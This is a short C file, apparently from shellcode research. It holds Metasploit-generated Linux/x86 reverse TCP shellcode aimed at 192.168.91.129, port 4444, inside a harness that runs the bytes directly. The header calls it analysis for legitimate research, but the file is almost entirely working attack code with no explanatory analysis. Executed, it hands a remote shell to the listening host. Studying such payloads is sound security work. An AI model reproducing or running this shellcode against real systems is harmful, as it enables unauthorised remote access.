// Linux/x86/shell_reverse_tcp shellcode analysis
// msfpayload linux/x86/shell_reverse_tcp LHOST=192.168.91.129 C
// Filename: shell_reverse_tcp.c
// Author: Oleg Boytsev
// License http://creativecommons.org/licenses/by-sa/3.0/
// Legitimate use and research only
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.


#include<stdio.h>
#include<string.h>

unsigned char shellcode[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x5b\x81\x68"
"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
main()
{
        printf("Shellcode Length: %d\n",strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
